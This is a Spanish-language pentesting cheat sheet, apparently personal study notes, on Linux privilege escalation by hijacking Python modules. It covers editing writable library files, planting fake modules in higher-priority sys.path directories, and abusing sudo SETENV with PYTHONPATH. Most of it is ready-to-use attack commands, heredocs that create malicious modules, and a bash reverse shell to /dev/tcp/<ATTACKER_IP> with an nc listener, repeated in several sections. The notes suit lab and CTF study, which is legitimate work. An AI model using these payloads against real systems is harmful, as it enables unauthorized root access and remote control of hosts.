---
tags:
  - linux
  - privex
  - python
---
## Conceptos Clave (TL;DR)

- Python importa módulos siguiendo un orden de prioridad definido en `sys.path`; el primer archivo que coincida con el nombre del módulo buscado es el que se importa, independientemente de si es el legítimo.
- Si un script con SUID/SGID importa un módulo cuyo archivo tiene permisos de escritura para usuarios no privilegiados, es posible inyectar código malicioso directamente en ese archivo de biblioteca.
- Si existe un directorio de mayor prioridad en `sys.path` con permisos de escritura, se puede plantar un archivo `.py` falso con el mismo nombre del módulo legítimo para que Python lo importe primero.
- Si `sudo -l` muestra la flag `SETENV` junto a un binario de Python, es posible definir `PYTHONPATH` apuntando a un directorio controlado por el atacante, forzando a Python a cargar el módulo malicioso desde ahí con privilegios de root.

## Herramientas Clave

- `python3` / `pip3`: Intérprete y gestor de paquetes; se usa para listar rutas de búsqueda de módulos y localizar la instalación de bibliotecas objetivo.
- `grep`: Localizar la función específica a hijackear dentro de los archivos de la biblioteca.
- `ls -l` / `ls -la`: Verificar permisos de escritura en archivos de módulos y directorios de `sys.path`.
- `sudo -l`: Comprobar si el usuario tiene permitido ejecutar Python con `SETENV` o sin contraseña.
- Editor de texto (`vim`, `nano`, `echo`): Modificar el módulo legítimo o crear el módulo falso con el payload.

## Metodología Paso a Paso

### Fase 1: Reconocimiento — Identificar el Script Privilegiado y el Módulo que Importa

Buscar scripts Python con bits SUID/SGID activos. Una vez localizado, leer su contenido para identificar qué módulos importa y qué funciones de esos módulos utiliza. Estos son los puntos de inyección candidatos.

```bash
# Buscar scripts Python con SUID o SGID en el sistema
find / -type f -name "*.py" -perm /6000 2>/dev/null

# Revisar permisos y contenido del script objetivo
ls -l <SCRIPT_PATH>
cat <SCRIPT_PATH>
```

### Fase 2: Reconocimiento — Auditar Permisos de la Biblioteca y del sys.path

Determinar en qué ruta está instalado el módulo importado y listar el orden de búsqueda completo de Python. Luego verificar permisos de escritura en los archivos del módulo y en cada directorio de `sys.path`.

```bash
# Listar el orden de búsqueda de módulos (sys.path)
python3 -c 'import sys; print("\n".join(sys.path))'

# Localizar la ruta de instalación del módulo objetivo
pip3 show <MODULE_NAME>

# Buscar la función objetivo dentro de los archivos de la biblioteca
grep -r "def <FUNCTION_NAME>" /usr/local/lib/<PYTHON_VERSION>/dist-packages/<MODULE_NAME>/*

# Revisar permisos del archivo principal del módulo
ls -l /usr/local/lib/<PYTHON_VERSION>/dist-packages/<MODULE_NAME>/__init__.py

# Revisar permisos de escritura en los directorios del sys.path
ls -la /usr/lib/<PYTHON_VERSION>/
```

### Fase 3 (Vector A): Hijacking por Permisos de Escritura en el Módulo Legítimo

Si el archivo de la biblioteca tiene permisos de escritura para el usuario actual (`-rw-r--rw-` o similar), se edita directamente la función que usa el script privilegiado para inyectar código que se ejecutará con los privilegios del SUID.

```bash
# Editar el módulo legítimo e inyectar el payload en la función objetivo
# El payload se inserta al inicio del cuerpo de la función
vim /usr/local/lib/<PYTHON_VERSION>/dist-packages/<MODULE_NAME>/__init__.py
```

Contenido a inyectar al inicio de la función objetivo:
```python
# Payload dentro de la función hijackeada
import os
os.system('id')
# Para una shell: os.system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"')
```

### Fase 4 (Vector B): Hijacking por Ruta de Mayor Prioridad (Library Path)

Si existe un directorio con mayor prioridad en `sys.path` que tiene permisos de escritura para el usuario actual, se crea un archivo falso con el mismo nombre del módulo legítimo. Python lo cargará antes que el real.

Requisitos:
- El módulo legítimo está en una ruta de MENOR prioridad en `sys.path`.
- Existe una ruta de MAYOR prioridad con permisos de escritura.

```bash
# Crear el módulo falso en el directorio de mayor prioridad con permisos de escritura
# El nombre del archivo debe ser exactamente igual al del módulo importado
# La función debe tener el mismo nombre y firma (número de argumentos) que la original
cat > <WRITABLE_HIGH_PRIORITY_PATH>/<MODULE_NAME>.py << 'EOF'
#!/usr/bin/env python3

import os

def <FUNCTION_NAME>():
    os.system('id')
    # Para una shell: os.system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"')
EOF
```

### Fase 5 (Vector C): Hijacking mediante la Variable de Entorno PYTHONPATH

Si `sudo -l` muestra `SETENV: NOPASSWD` junto al binario de Python, se puede forzar a Python a buscar módulos en un directorio controlado por el atacante (ej. `/tmp`) pasando `PYTHONPATH` al invocar `sudo`.

```bash
# Colocar el módulo falso en el directorio controlado (ej. /tmp)
cp <WRITABLE_HIGH_PRIORITY_PATH>/<MODULE_NAME>.py /tmp/<MODULE_NAME>.py

# Ejecutar el script privilegiado con PYTHONPATH apuntando al directorio malicioso
sudo PYTHONPATH=/tmp/ /usr/bin/python3 <SCRIPT_PATH>
```

### Fase 6: Escalar a Shell de Root

Una vez confirmada la ejecución de código (validado con `id`), reemplazar el payload de prueba por un reverse shell.

```bash
# Payload de reverse shell para insertar en el módulo hijackeado
import os
os.system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"')
```

```bash
# Listener en la máquina atacante
nc -lvnp <ATTACKER_PORT>
```

## Cheat Sheet de Comandos

```bash
# Encontrar scripts Python con SUID o SGID
find / -type f -name "*.py" -perm /6000 2>/dev/null

# Revisar permisos de un script Python identificado
ls -l <SCRIPT_PATH>

# Leer el contenido del script para identificar módulos e importaciones
cat <SCRIPT_PATH>

# Listar el orden de prioridad de búsqueda de módulos de Python (sys.path)
python3 -c 'import sys; print("\n".join(sys.path))'

# Localizar en qué ruta está instalado el módulo objetivo
pip3 show <MODULE_NAME>

# Buscar la definición de la función objetivo en todos los archivos del módulo
grep -r "def <FUNCTION_NAME>" /usr/local/lib/<PYTHON_VERSION>/dist-packages/<MODULE_NAME>/*

# Verificar permisos del archivo principal del módulo (buscar escritura para otros)
ls -l /usr/local/lib/<PYTHON_VERSION>/dist-packages/<MODULE_NAME>/__init__.py

# Verificar permisos de todos los directorios en sys.path (buscar drwxrwxrwx o similares)
ls -la /usr/lib/<PYTHON_VERSION>/
ls -la /usr/local/lib/<PYTHON_VERSION>/dist-packages/

# Comprobar permisos sudo del usuario actual (buscar SETENV y binarios de Python)
sudo -l
```

```bash
# --- Vector B: Crear módulo falso en directorio de mayor prioridad ---
# Nombre de archivo = nombre exacto del módulo importado en el script objetivo
# La funcion debe tener la misma firma que la original
cat > <WRITABLE_HIGH_PRIORITY_PATH>/<MODULE_NAME>.py << 'EOF'
#!/usr/bin/env python3
import os

def <FUNCTION_NAME>():
    os.system('id')
EOF
```

```bash
# --- Vector C: Ejecutar con PYTHONPATH personalizado (requiere SETENV en sudo) ---
# PYTHONPATH=/tmp/ indica a Python que busque módulos primero en /tmp/
sudo PYTHONPATH=/tmp/ /usr/bin/python3 <SCRIPT_PATH>
```

```bash
# --- Ejecución del script privilegiado para triggear el hijack (Vectores A y B) ---
sudo /usr/bin/python3 <SCRIPT_PATH>
```

```bash
# --- Listener para recibir el reverse shell ---
# -l: modo escucha, -v: verbose, -n: sin resolución DNS, -p: puerto
nc -lvnp <ATTACKER_PORT>
```

```python
# --- Payload de reverse shell para insertar en la función hijackeada ---
import os
os.system('bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"')
```

## "Gotchas" y Troubleshooting

- **El nombre del módulo falso debe ser exacto**: El archivo `.py` creado debe llamarse exactamente igual al módulo que el script importa (ej. si el script hace `import psutil`, el archivo debe ser `psutil.py`). Cualquier diferencia hace que el ataque falle silenciosamente.
- **La firma de la función debe coincidir**: La función inyectada debe tener el mismo nombre y el mismo número de argumentos que la función original que es llamada por el script víctima. Si el número de parámetros no coincide, Python lanzará un `TypeError` y el ataque fallará.
- **El error `AttributeError: 'NoneType'` es normal en Vector B**: Cuando se hijackea por Library Path y la función falsa no devuelve el objeto esperado, el script lanzará un traceback después de ejecutar el payload. Esto es esperado; lo importante es que el código malicioso ya se ejecutó antes del error.
- **`SETENV` es la condición crítica para Vector C**: Sin la flag `SETENV` en la entrada de `sudo -l`, las variables de entorno definidas antes de `sudo` son limpiadas por `env_reset` y el ataque no funciona.
- **`env_reset` en sudoers limpia el entorno por defecto**: La presencia de `env_reset` en los "Defaults" de `sudo -l` confirma que el entorno se sanitiza, haciendo que el Vector C sea inviable a menos que `SETENV` esté explícitamente permitido para el binario objetivo.
- **Verificar todos los directorios de `sys.path`**: No asumir que solo el primero de la lista es relevante; el objetivo es encontrar cualquier directorio escribible que tenga MAYOR prioridad que la ubicación real del módulo legítimo.
- **Los permisos de escritura en módulos son infrecuentes en producción pero comunes en entornos dev**: Buscar especialmente en hosts de desarrollo o staging donde múltiples usuarios comparten el mismo entorno de Python.
- **El payload se ejecuta con los privilegios del proceso que invoca el script**: Si el script tiene SUID de root o se ejecuta con `sudo`, el payload heredará esos privilegios. Verificar el propietario del proceso antes de asumir que se obtendrá root.